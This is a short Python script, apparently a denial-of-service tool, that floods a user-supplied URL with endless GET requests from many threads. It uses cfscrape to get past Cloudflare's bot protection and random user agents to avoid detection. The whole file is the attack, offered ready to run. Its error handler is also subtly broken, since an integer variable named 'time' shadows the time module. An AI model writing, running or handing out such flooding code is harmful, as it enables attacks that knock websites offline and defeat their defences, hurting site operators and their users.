import cfscrape 
import threading,random
from fake_useragent import UserAgent
ua = UserAgent()
url = input("Enter Url : ")
thread = int(input("thread : "))
time = int(input("Time : "))


def Attack():
	s = cfscrape.create_scraper()
	
	while True:
		try:
			for i in range(thread):
				send = s.get(url,headers = {"Connection": "Keep-Alive", "Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "User-Agent": f"{ua.random}", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-US;q=0.9"})
				print (f"Connect To Website {url} {str(send.status_code)}")
			
			
				
			
			
			
		except:
			s.close()
			time.sleep(5.00)
			print ("Check Url or Internet !")
		
	
	
		
	
		
		
		
	
		
		
	
		
	
    	
    
    
	
	
	
for i in range (time):
	att=threading.Thread(target=Attack)
	att.start()